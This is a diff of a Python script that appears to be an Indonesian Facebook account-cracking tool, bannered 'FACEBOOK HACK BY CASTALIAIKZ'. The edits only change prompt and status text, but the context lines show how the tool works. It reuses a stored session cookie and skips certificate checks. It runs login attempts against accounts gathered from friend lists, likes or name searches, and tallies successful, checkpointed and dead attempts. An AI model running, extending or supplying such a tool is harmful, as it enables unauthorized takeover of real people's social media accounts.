@@ -32,7 +32,7 @@ def masuk():
         try:
                 cek = open("cookies").read()
         except FileNotFoundError:
-                cek = input("[\033[1;32m>\033[0m Enter Cookie : ")
+                cek = input("[\033[1;32m>\033[0m Masukan Cookie : ")
         cek = {"cookie":cek}
         ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
         if "mbasic_logout_button" in str(ismi):
@@ -91,7 +91,7 @@ def login(username,password,cek=False):
         else:
                 die += 1
         for i in list('\|/-•'):
-                        print(f"\r[{i}] Life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
+                        print(f"\r[{i}] Success : ({str(result)}) Checkpoint : ({str(check)}) Die : ({str(die)})",end="")
                         time.sleep(0.2)
 def getid(url):
         raw = requests.get(url,cookies=kuki).content
@@ -157,7 +157,7 @@ if __name__ == '__main__':
                 ses = requests.Session()
                 kukis = masuk()
                 kuki = {'cookie':kukis}
-                print('\n\n\t\t≺ \033[1;36mFACEBOOK HACK BY CASTALIAIKZ\033[0m ≻\n\n')
+                print('\n\n\t\t!!! \033[1;36m]FACEBOOK HACK BY CASTALIAIKZ\033[0m !!!\n\n')
                 print('\033[1;91m┣━ \033[0m[\033[1;32m1\033[0m] Crack dari daftar teman')
                 print('\033[1;91m┣━\033[0m [\033[1;32m2\033[0m] Crack dari Likes\033[1;91m ')
                 print('┣━ \033[0m[\033[1;32m3\033[0m] Crack dari nama')
